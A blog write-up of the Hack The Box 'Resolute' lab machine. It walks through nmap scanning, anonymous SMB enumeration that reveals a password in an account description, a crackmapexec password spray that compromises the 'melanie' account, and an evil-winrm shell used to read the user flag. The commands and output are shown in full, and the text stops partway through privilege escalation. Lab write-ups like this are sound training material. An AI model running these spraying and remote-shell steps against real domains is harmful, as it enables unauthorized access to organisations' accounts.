---
title: Write-up Resolute on HTB
author: eMVee
date: 2022-10-11 21:00:00 +0800
categories: [CTF, HTB]
tags: [HTB, OSCP, Active Directory, AD, DNSadmins]
render_with_liquid: false
---

Today I was looking on the Hack The Box website and then I noticed that there was a staff pick on a Windows machine with a medium difficulty level. A machine that I have not done before on HTB. Time to change that.
## HTB - Resolute writeup

After spawning the target an IP address was given to the machine. As most of the time I assign the IP addres to a variabele in the CLI.
```
┌──(emvee㉿kali)-[~]
└─$ ip=10.129.96.155
```
To see if the target is up and running I check this with a ping request to the machine.
```
┌──(emvee㉿kali)-[~]
└─$ ping -c3 $ip
PING 10.129.96.155 (10.129.96.155) 56(84) bytes of data.
64 bytes from 10.129.96.155: icmp_seq=1 ttl=127 time=18.4 ms
64 bytes from 10.129.96.155: icmp_seq=2 ttl=127 time=17.4 ms
64 bytes from 10.129.96.155: icmp_seq=3 ttl=127 time=17.9 ms

--- 10.129.96.155 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 17.430/17.933/18.428/0.407 ms
```
It sends a reply back and as aspected it has a value of 127 assigned to the ttl field.
This is an indicator that this machine is running probably on an Windows operating system.
Since I don't need to discover any other hosts, I start with a nmap scan to identify open ports and services running on the target.
```
┌──(emvee㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip                                                                                                                 
[sudo] password for emvee: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 11:11 CEST
Nmap scan report for 10.129.96.155
Host is up (0.017s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-10-11 09:18:55Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49686/tcp open  msrpc        Microsoft Windows RPC
49729/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/11%OT=53%CT=1%CU=33109%PV=Y%DS=2%DC=T%G=Y%TM=634533
OS:A0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%TS
OS:=A)OPS(O1=M539NW8ST11%O2=M539NW8ST11%O3=M539NW8NNT11%O4=M539NW8ST11%O5=M
OS:539NW8ST11%O6=M539ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20
OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M539NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A
OS:%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m01s, deviation: 4h02m29s, median: 7m00s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2022-10-11T09:19:57
|_  start_date: 2022-10-11T09:16:49
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2022-10-11T02:19:56-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   16.87 ms 10.10.14.1
2   17.05 ms 10.129.96.155

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.85 seconds
                                                                        

```
Within two minutes nmap finished the scan and several interesting services running on the target. I added the following items to my notes.

* Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
* Port 53
    * DNS
* Port 88
    * Kerberos
* Port 135, 139, 445
    * SMB
* Port 389
    * LDAP
* Port 636
    * tcpwrapped
* Port 3268
    * Domain: megabank.local
* Port 5985
    * winrm
      * Evilwinrm
* Other information
    * FQDN: Resolute.megabank.local
    * Forest name: megabank.local
    * Domain name: megabank.local

Based on the results I decided to start with enum4linux to enumerate more based on the SMB service.

```
┌──(emvee㉿kali)-[~]
└─$ enum4linux -a -u "" -p "" $ip
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Oct 11 11:20:18 2022

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                                           
Target ........... 10.129.96.155                                                                                                                                                                                                           
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.129.96.155 )===========================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[E] Can't find workgroup/domain                                                                                                                                                                                                            
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           

 ===============================( Nbtstat Information for 10.129.96.155 )===============================
                                                                                                                                                                                                                                           
Looking up status of 10.129.96.155                                                                                                                                                                                                         
No reply from 10.129.96.155

 ===================================( Session Check on 10.129.96.155 )===================================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[+] Server 10.129.96.155 allows sessions using username '', password ''                                                                                                                                                                    
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
 ================================( Getting domain SID for 10.129.96.155 )================================
                                                                                                                                                                                                                                           
Domain Name: MEGABANK                                                                                                                                                                                                                      
Domain Sid: S-1-5-21-1392959593-3013219662-3596683436

[+] Host is part of a domain (not a workgroup)                                                                                                                                                                                             
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
 ==================================( OS information on 10.129.96.155 )==================================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[E] Can't get OS info with smbclient                                                                                                                                                                                                       
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[+] Got OS info for 10.129.96.155 from srvinfo:                                                                                                                                                                                            
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                                     


 =======================================( Users on 10.129.96.155 )=======================================
                                                                                                                                                                                                                                           
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)                                                                                                                                               
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

 =================================( Share Enumeration on 10.129.96.155 )=================================
                                                                                                                                                                                                                                           
do_connect: Connection to 10.129.96.155 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                                                                   

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.129.96.155                                                                                                                                                                                              
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
 ===========================( Password Policy Information for 10.129.96.155 )===========================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           

[+] Attaching to 10.129.96.155 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.129.96.155)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] MEGABANK
        [+] Builtin

[+] Password Info for Domain: MEGABANK

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                                                                                                                                       
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
Password Complexity: Disabled                                                                                                                                                                                                              
Minimum Password Length: 7


 ======================================( Groups on 10.129.96.155 )======================================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[+] Getting builtin groups:                                                                                                                                                                                                                
                                                                                                                                                                                                                                           
group:[Account Operators] rid:[0x224]                                                                                                                                                                                                      
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+]  Getting builtin group memberships:                                                                                                                                                                                                    
                                                                                                                                                                                                                                           
Group: System Managed Accounts Group' (RID: 581) has member: Couldn't lookup SIDs                                                                                                                                                          
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group: Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group: Administrators' (RID: 544) has member: Couldn't lookup SIDs
Group: Guests' (RID: 546) has member: Couldn't lookup SIDs
Group: Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group: IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group: Users' (RID: 545) has member: Couldn't lookup SIDs

[+]  Getting local groups:                                                                                                                                                                                                                 
                                                                                                                                                                                                                                           
group:[Cert Publishers] rid:[0x205]                                                                                                                                                                                                        
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:                                                                                                                                                                                                      
                                                                                                                                                                                                                                           
Group: DnsAdmins' (RID: 1101) has member: Couldn't lookup SIDs                                                                                                                                                                             
Group: Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs

[+]  Getting domain groups:                                                                                                                                                                                                                
                                                                                                                                                                                                                                           
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                                                                                                                                                
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Contractors] rid:[0x44f]

[+]  Getting domain group memberships:                                                                                                                                                                                                     
                                                                                                                                                                                                                                           
Group: 'Schema Admins' (RID: 518) has member: MEGABANK\Administrator                                                                                                                                                                       
Group: 'Enterprise Admins' (RID: 519) has member: MEGABANK\Administrator
Group: 'Domain Computers' (RID: 515) has member: MEGABANK\MS02$
Group: 'Domain Controllers' (RID: 516) has member: MEGABANK\RESOLUTE$
Group: 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Group: 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group: 'Domain Users' (RID: 513) has member: MEGABANK\DefaultAccount
Group: 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group: 'Domain Users' (RID: 513) has member: MEGABANK\ryan
Group: 'Domain Users' (RID: 513) has member: MEGABANK\marko
Group: 'Domain Users' (RID: 513) has member: MEGABANK\sunita
Group: 'Domain Users' (RID: 513) has member: MEGABANK\abigail
Group: 'Domain Users' (RID: 513) has member: MEGABANK\marcus
Group: 'Domain Users' (RID: 513) has member: MEGABANK\sally
Group: 'Domain Users' (RID: 513) has member: MEGABANK\fred
Group: 'Domain Users' (RID: 513) has member: MEGABANK\angela
Group: 'Domain Users' (RID: 513) has member: MEGABANK\felicia
Group: 'Domain Users' (RID: 513) has member: MEGABANK\gustavo
Group: 'Domain Users' (RID: 513) has member: MEGABANK\ulf
Group: 'Domain Users' (RID: 513) has member: MEGABANK\stevie
Group: 'Domain Users' (RID: 513) has member: MEGABANK\claire
Group: 'Domain Users' (RID: 513) has member: MEGABANK\paulo
Group: 'Domain Users' (RID: 513) has member: MEGABANK\steve
Group: 'Domain Users' (RID: 513) has member: MEGABANK\annette
Group: 'Domain Users' (RID: 513) has member: MEGABANK\annika
Group: 'Domain Users' (RID: 513) has member: MEGABANK\per
Group: 'Domain Users' (RID: 513) has member: MEGABANK\claude
Group: 'Domain Users' (RID: 513) has member: MEGABANK\melanie
Group: 'Domain Users' (RID: 513) has member: MEGABANK\zach
Group: 'Domain Users' (RID: 513) has member: MEGABANK\simon
Group: 'Domain Users' (RID: 513) has member: MEGABANK\naoki
Group: 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group: 'Contractors' (RID: 1103) has member: MEGABANK\ryan
Group: 'Domain Admins' (RID: 512) has member: MEGABANK\Administrator

 ==================( Users on 10.129.96.155 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                                                                                                                                                  
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
 ===============================( Getting printer info for 10.129.96.155 )===============================
                                                                                                                                                                                                                                           
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                                    


enum4linux complete on Tue Oct 11 11:21:07 2022

```
I did not expected this much information, such as groups and usernames and even a password written in the description. I added the follwing infromation to my notes.
Users:
* abigail
* Administrator
* angela
* annette
* annika
* claire
* claude
* felicia
* fred
* gustavo
* marcus
* marko → Password set to Welcome123!
* melanie
* naoki
* paulo
* per
* ryan
* sally
* simon
* steve
* stevie
* sunita
* ulf

Group: 'Contractors' (RID: 1103) has member: MEGABANK\ryan

Since a password was written into the the description field of the user "marko", I had to check if those credentials are correct.

```
┌──(emvee㉿kali)-[~/Documents/Resolute]
└─$ crackmapexec smb $ip -u marko -p 'Welcome123!' --continue-on-success
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
```
It did not work... So perhaps I could spray the password against one of the other usernames. I added all the usernames to a file users.txt
To spray the password against all users I use the following command: **crackmapexec smb $ip -u users.txt -p 'Welcome123!' --continue-on-success**.
```
┌──(emvee㉿kali)-[~/Documents/Resolute]
└─$ crackmapexec smb $ip -u users.txt -p 'Welcome123!' --continue-on-success
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE 
```
It looks like the password works on the account for "melanie". The following information is added to my notes: melanie:Welcome123! 
I can use the credentials of melanie to gather some information about all the users.
```
┌──(emvee㉿kali)-[~/Documents/Resolute]
└─$ GetADUsers.py -all -dc-ip $ip megabank.local/melanie
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Querying 10.129.96.155 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2022-10-11 13:23:03  2022-10-11 11:17:43 
Guest                                                 <never>              <never>             
DefaultAccount                                        <never>              <never>             
krbtgt                                                2019-09-25 15:29:12  <never>             
ryan                                                  2022-10-11 13:25:02  <never>             
marko                                                 2019-09-27 15:17:14  <never>             
sunita                                                2019-12-03 22:26:29  <never>             
abigail                                               2019-12-03 22:27:30  <never>             
marcus                                                2019-12-03 22:27:59  <never>             
sally                                                 2019-12-03 22:28:29  <never>             
fred                                                  2019-12-03 22:29:01  <never>             
angela                                                2019-12-03 22:29:43  <never>             
felicia                                               2019-12-03 22:30:53  <never>             
gustavo                                               2019-12-03 22:31:42  <never>             
ulf                                                   2019-12-03 22:32:19  <never>             
stevie                                                2019-12-03 22:33:13  <never>             
claire                                                2019-12-03 22:33:44  <never>             
paulo                                                 2019-12-03 22:34:46  <never>             
steve                                                 2019-12-03 22:35:25  <never>             
annette                                               2019-12-03 22:36:55  <never>             
annika                                                2019-12-03 22:37:23  <never>             
per                                                   2019-12-03 22:38:12  <never>             
claude                                                2019-12-03 22:39:56  <never>             
melanie                                               2022-10-11 13:23:03  2022-10-11 13:20:02 
zach                                                  2019-12-04 11:39:27  <never>             
simon                                                 2019-12-04 11:39:58  <never>             
naoki                                                 2019-12-04 11:40:44  <never>   
```
It looks like none of the other users have logon to the system. Perhaps a shares is available for melanie. To see which shares are available I run the crackmapexec tool/

```
┌──(emvee㉿kali)-[~/Documents/Resolute]
└─$ crackmapexec smb $ip -u melanie -p 'Welcome123!' --shares      
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
SMB         10.129.96.155   445    RESOLUTE         [+] Enumerated shares
SMB         10.129.96.155   445    RESOLUTE         Share           Permissions     Remark
SMB         10.129.96.155   445    RESOLUTE         -----           -----------     ------
SMB         10.129.96.155   445    RESOLUTE         ADMIN$                          Remote Admin
SMB         10.129.96.155   445    RESOLUTE         C$                              Default share
SMB         10.129.96.155   445    RESOLUTE         IPC$                            Remote IPC
SMB         10.129.96.155   445    RESOLUTE         NETLOGON        READ            Logon server share 
SMB         10.129.96.155   445    RESOLUTE         SYSVOL          READ            Logon server share 
```
The shares which are available are not interesting for me. So I decided to spawn a shell with evil-winrm as melanie.

```
┌──(emvee㉿kali)-[~/Documents/Resolute]
└─$ evil-winrm -i $ip -u "melanie" -p 'Welcome123!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents> 
```
The shell was started, so time to capture the user flag.
```
*Evil-WinRM* PS C:\Users\melanie\Documents> dir ..


    Directory: C:\Users\melanie


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        12/4/2019   2:47 AM                Desktop
d-r---        12/4/2019   2:46 AM                Documents
d-r---        7/16/2016   6:18 AM                Downloads
d-r---        7/16/2016   6:18 AM                Favorites
d-r---        7/16/2016   6:18 AM                Links
d-r---        7/16/2016   6:18 AM                Music
d-r---        7/16/2016   6:18 AM                Pictures
d-----        7/16/2016   6:18 AM                Saved Games
d-r---        7/16/2016   6:18 AM                Videos


*Evil-WinRM* PS C:\Users\melanie\Documents> dir ../Desktop


    Directory: C:\Users\melanie\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/11/2022   2:17 AM             34 user.txt


*Evil-WinRM* PS C:\Users\melanie\Documents> type ../Desktop/user.txt
<---- SNIP USER FLAG ----> 
*Evil-WinRM* PS C:\Users\melanie\Documents> 
```
After capturing the user flag, it was time to move on and escalte privileges so I can own the machine.
Since this machine has an Active Directory available I decided to upload SharpHound.exe to the target with evil-winrm.
I decided to look into the users directory to see which users are present on the system.
```
*Evil-WinRM* PS C:\Users\melanie\Documents> ls c:\users -force


    Directory: C:\users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019  10:43 AM                Administrator
d--hsl        7/16/2016   6:28 AM                All Users
d-rh--        9/25/2019  10:17 AM                Default
d--hsl        7/16/2016   6:28 AM                Default User
d-----        12/4/2019   2:46 AM                melanie
d-r---       11/20/2016   6:39 PM                Public
d-----        9/27/2019   7:05 AM                ryan
-a-hs-        7/16/2016   6:16 AM            174 desktop.ini
```
It looks like there is a directory available for ryan, so it's time to find out some information about ryan.
```
*Evil-WinRM* PS C:\Users\melanie\Documents> net user ryan
User name                    ryan
Full Name                    Ryan Bertrand
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/11/2022 4:43:02 AM
Password expires             Never
Password changeable          10/12/2022 4:43:02 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never
